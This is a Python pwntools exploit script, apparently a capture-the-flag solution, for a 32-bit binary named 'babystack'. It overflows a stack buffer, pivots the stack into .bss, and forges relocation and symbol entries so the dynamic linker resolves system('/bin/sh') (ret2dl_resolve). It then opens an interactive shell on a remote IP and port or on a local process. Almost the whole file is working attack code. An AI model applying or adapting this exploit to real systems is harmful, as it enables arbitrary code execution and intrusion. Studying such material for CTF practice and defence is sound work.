#!/usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
"""
sys.path.append("/home/tree/pwntools/roputils")
from roputils import *
"""

context.binary = './babystack'
context.log_level = 'debug'
context.timeout = None
elf = context.binary
libc = context.binary.libc

def dbg():
	raw_input()
if args['REMOTE']:
	p = remote('47.106.94.13', 50025)

else:
	p = process('./babystack')
	#gdb.attach(p, 'b* 0x08048455')
	dbg()


#rop information
read_plt = 0x08048300 
bss_buf = 0x0804A020
leave_ret = 0x08048455

pop_3_ret = 0x080484e9 		# pop esi ; pop edi ; pop ebp ; ret
pop_ebp_ret = 0x080484eb 	# pop ebp ; ret

#stack poivt and read(0, bss, 0x1000)
payload = 'a'*0x28
payload += p32(bss_buf)		#ebp ==> bss_buf
payload += p32(read_plt) + p32(leave_ret) + p32(0) + p32(bss_buf) + p32(0x36)
p.send(payload)

dbg()

stack_size = 0x800
control_base = bss_buf + stack_size
payload = 'a'*0x4 							#read(0, bss_buf = ebp, 0x1000), 		while ebp+4 is ret_addr
payload += p32(read_plt) + p32(pop_3_ret) + p32(0) + p32(control_base) + p32(0x1000)
payload += p32(pop_ebp_ret) + p32(control_base)		#ebp = control_base, so ret_addr is at control_base+4 which is plt_0
payload += p32(leave_ret)

p.send(payload)

#elf information

rel_plt = 0x80482b0
jmptab = 0x80482b0

dynsym = 0x080481cc
symtab = 0x080481cc

dynstr = 0x0804822c
strtab = 0x0804822c

#fake information
alarm_got = elf.got['alarm']
fake_sym_addr = control_base + 0x24
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr += align

index_sym = (fake_sym_addr - dynsym) / 0x10
r_info = index_sym << 8 | 7
fake_reloc=p32(alarm_got)+p32(r_info)							# reloc fake alarm->system

st_name=fake_sym_addr+0x10-dynstr
fake_sym=p32(st_name)+p32(0)+p32(0)+p32(0x12)

plt_0 = 0x080482F0
index_offset = (control_base + 0x1c) - rel_plt						#plt_i索引
cmd = '/bin/sh\x00'
																	#dl_runtime_resolve(plt0, indexoffset)
payload = 'a'*4 													#PLT0代码
payload += p32(plt_0)												#push link_map; jmp dl_runtime_resolve.
payload += p32(index_offset)										#push idx
payload += 'a'*4
payload += p32(control_base + 0x50)									#pointer to args
payload += 'a'*8


payload += fake_reloc												#control_base + 0x1c
payload += 'b'*8

payload += fake_sym 												#control_base + 0x24
payload += 'system\x00'
payload = payload.ljust(0x50, 'a')
payload += cmd														#被解析函数的参数位置
payload = payload.ljust(0x64, 'a')

dbg()
p.send(payload)



p.interactive()
p.close()


